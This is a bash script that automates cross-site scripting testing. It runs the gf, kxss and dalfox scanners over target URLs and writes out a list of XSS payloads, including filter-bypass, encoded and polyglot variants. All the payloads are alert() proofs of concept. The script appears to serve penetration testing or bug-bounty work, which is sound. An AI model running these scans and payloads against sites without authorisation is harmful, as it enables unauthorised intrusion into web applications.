#!/bin/bash

#====================================================================
#  XSS TESTING AUTOMATION SCRIPT
#====================================================================
#  Automated XSS vulnerability testing
#  
#  Usage: ./xss-test.sh <url_or_file> [output_dir]
#====================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

if [[ -z "$1" ]]; then
    echo -e "${RED}Usage: $0 <url|url_file> [output_dir]${NC}"
    echo "Examples:"
    echo "  $0 'https://example.com/search?q=test'"
    echo "  $0 urls-with-params.txt"
    exit 1
fi

TARGET="$1"
OUTPUT_DIR="${2:-$HOME/HackTools/output/xss}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

mkdir -p "$OUTPUT_DIR"

echo -e "${CYAN}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║               XSS TESTING AUTOMATION                      ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Determine if target is file or URL
if [[ -f "$TARGET" ]]; then
    URL_FILE="$TARGET"
    URL_COUNT=$(wc -l < "$URL_FILE")
    echo -e "${GREEN}[+] Testing $URL_COUNT URLs from file${NC}"
else
    echo "$TARGET" > "/tmp/xss-target-$TIMESTAMP.txt"
    URL_FILE="/tmp/xss-target-$TIMESTAMP.txt"
    echo -e "${GREEN}[+] Testing URL: $TARGET${NC}"
fi

echo ""

#====================================================================
# DALFOX SCANNING
#====================================================================
dalfox_scan() {
    echo -e "${YELLOW}[*] Running Dalfox XSS Scanner...${NC}"
    
    if command -v dalfox &> /dev/null; then
        dalfox file "$URL_FILE" \
            --silence \
            --no-color \
            -o "$OUTPUT_DIR/dalfox-results-$TIMESTAMP.txt" 2>/dev/null || true
        
        if [[ -f "$OUTPUT_DIR/dalfox-results-$TIMESTAMP.txt" ]]; then
            FINDINGS=$(wc -l < "$OUTPUT_DIR/dalfox-results-$TIMESTAMP.txt")
            echo -e "${GREEN}[+] Dalfox found $FINDINGS potential XSS${NC}"
        fi
    else
        echo -e "${YELLOW}[!] Dalfox not installed, skipping...${NC}"
    fi
}

#====================================================================
# KXSS SCANNING
#====================================================================
kxss_scan() {
    echo -e "${YELLOW}[*] Running Kxss reflection finder...${NC}"
    
    if command -v kxss &> /dev/null; then
        cat "$URL_FILE" | kxss 2>/dev/null | tee "$OUTPUT_DIR/kxss-results-$TIMESTAMP.txt" || true
        
        if [[ -f "$OUTPUT_DIR/kxss-results-$TIMESTAMP.txt" ]]; then
            FINDINGS=$(wc -l < "$OUTPUT_DIR/kxss-results-$TIMESTAMP.txt")
            echo -e "${GREEN}[+] Kxss found $FINDINGS reflected parameters${NC}"
        fi
    else
        echo -e "${YELLOW}[!] Kxss not installed, skipping...${NC}"
    fi
}

#====================================================================
# XSSTRIKE SCANNING
#====================================================================
xsstrike_scan() {
    echo -e "${YELLOW}[*] Running XSStrike...${NC}"
    
    XSSTRIKE_PATH="$HOME/HackTools/web-testing/XSStrike/xsstrike.py"
    
    if [[ -f "$XSSTRIKE_PATH" ]]; then
        while IFS= read -r url; do
            echo -e "${BLUE}[>] Testing: $url${NC}"
            python3 "$XSSTRIKE_PATH" -u "$url" --skip 2>/dev/null >> "$OUTPUT_DIR/xsstrike-results-$TIMESTAMP.txt" || true
        done < "$URL_FILE"
    else
        echo -e "${YELLOW}[!] XSStrike not installed, skipping...${NC}"
    fi
}

#====================================================================
# GF PATTERN MATCHING
#====================================================================
gf_xss() {
    echo -e "${YELLOW}[*] Finding XSS-prone parameters with GF...${NC}"
    
    if command -v gf &> /dev/null; then
        cat "$URL_FILE" | gf xss 2>/dev/null | sort -u > "$OUTPUT_DIR/gf-xss-params-$TIMESTAMP.txt" || true
        
        if [[ -f "$OUTPUT_DIR/gf-xss-params-$TIMESTAMP.txt" ]]; then
            PARAMS=$(wc -l < "$OUTPUT_DIR/gf-xss-params-$TIMESTAMP.txt")
            echo -e "${GREEN}[+] Found $PARAMS XSS-prone parameters${NC}"
        fi
    else
        echo -e "${YELLOW}[!] GF not installed, skipping...${NC}"
    fi
}

#====================================================================
# GENERATE PAYLOADS FOR MANUAL TESTING
#====================================================================
generate_payloads() {
    echo -e "${YELLOW}[*] Generating XSS payloads for manual testing...${NC}"
    
    cat > "$OUTPUT_DIR/xss-payloads.txt" << 'EOF'
# Basic XSS Payloads
<script>alert(1)</script>
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

# Event Handler Payloads
<img src=x onerror="alert(1)">
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

# Encoded Payloads
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;

# Filter Bypass Payloads
<ScRiPt>alert(1)</sCrIpT>
<script>alert`1`</script>
<script>alert(1)//
<script>alert(1)<!--
<script>alert(1)%0d%0a
<svg/onload=alert(1)>
<svg onload=alert(1)//

# DOM-based XSS
javascript:alert(1)
data:text/html,<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>

# Polyglot Payloads
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
EOF

    echo -e "${GREEN}[+] Payloads saved to: $OUTPUT_DIR/xss-payloads.txt${NC}"
}

#====================================================================
# MAIN
#====================================================================

# Run all scans
gf_xss
kxss_scan
dalfox_scan
generate_payloads

# Summary
echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}XSS TESTING COMPLETE${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo "Results saved to: $OUTPUT_DIR"
echo ""
echo "Files generated:"
ls -la "$OUTPUT_DIR/"*"$TIMESTAMP"* 2>/dev/null || echo "No results files"
echo ""
echo -e "${YELLOW}[!] Remember to verify findings manually before reporting!${NC}"

# Cleanup temp file
rm -f "/tmp/xss-target-$TIMESTAMP.txt"
